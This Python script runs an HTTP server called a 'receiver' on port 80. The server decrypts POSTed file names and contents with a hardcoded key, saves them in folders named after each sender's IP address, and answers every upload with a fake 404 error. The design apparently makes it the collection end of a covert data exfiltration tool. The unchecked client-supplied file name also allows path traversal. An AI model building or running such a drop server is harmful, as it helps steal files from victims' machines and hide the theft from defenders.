import os.path
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import encryption

DEFAULT_ERROR_MESSAGE = """\
<head>
<title>Error response</title>
</head>
<body>
<h1>Error response</h1>
<p>Error code %(code)d.
<p>Message: %(message)s.
<p>Error code explanation: %(code)s = %(explain)s.
</body>
"""

key = b'eoxuXDM-FYNQ_o0PxQaxCcXW-u6h26ytH4vx2zYCiM0='
e = encryption.encryption(key)


class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_response()
        self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        # logging.info(post_data.decode('utf-8'))
        di = post_data.index(b"\t")
        f_e = e.decrypt(post_data[:di]).decode('utf-8')
        d_e = e.decrypt(post_data[di + 1:]).decode('utf-8')
        if f_e == '/':
            logging.info(d_e)
        else:
            file_proc(f_e, d_e, self.client_address[0])

        self.send_error(404)
        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))


def file_proc(f_name, data, ip):
    path = os.path.join(os.getcwd(), ip)
    if not os.path.isdir(path):
        os.mkdir(path)
    fp = os.path.join(path, f_name)
    fps = os.path.split(fp)
    count = 0
    while True:
        if os.path.exists(fp):
            count += 1
            fp = fps[0] + "/" + fps[1] + "-v" + str(count)
        else:
            f = open(fp, "w+")
            f.write(data)
            break


class receiver:
    def __init__(self, server_class=HTTPServer, handler_class=S, port=80):
        self.server_class = server_class
        self.handler_class = handler_class
        self.port = port

    def run(self):
        logging.basicConfig(level=logging.INFO)
        server_address = ('', self.port)
        httpd = self.server_class(server_address, self.handler_class)
        logging.info('Starting receiver...\n')
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            pass
        httpd.server_close()
        logging.info('Stopping stopping receiver...\n')


r = receiver()
r.run()
